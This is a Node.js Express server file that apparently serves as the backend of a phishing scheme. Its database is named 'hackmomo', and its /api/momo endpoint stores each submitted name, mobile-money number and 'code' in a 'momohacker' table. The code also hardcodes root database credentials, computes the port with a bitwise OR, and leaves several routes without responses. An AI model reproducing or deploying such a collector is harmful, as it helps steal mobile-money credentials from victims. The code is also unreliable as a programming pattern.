const express = require("express");
const cors = require("cors");
const mysql = require("mysql");
const bodyParser = require("body-parser");
const Cookies = require("universal-cookie")

const PORT = process.env.PORT | 3001;

const app = express();

app.use(cors());
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

const db = mysql.createConnection({
  host: "192.168.23.137",
  user: "root",
  password: "root",
  database: "hackmomo",
});
db.connect((err) => {
  if (err) throw err;
  console.log("DB is connected successfully");
});

app.get('/admin', (req, res) => {
  console.log(req.headers)
})

app.get("/hacked", (req,res) => {
  res.json({hacktitle: 'Hacked '})
})

app.post("/api/momo", (req, res) => {
  const sql = "INSERT INTO momohacker(name, momonum,code) VALUES(?,?,?)";
  db.query(
    sql,
    [req.body.name, req.body.num, req.body.code],
    (err, result) => {
      if(err) throw err
      console.log("Insert successfully")
    }
  );
});

app.listen(PORT, () => {
  console.log(`Server is runnig on http://localhost:${PORT}`);
});
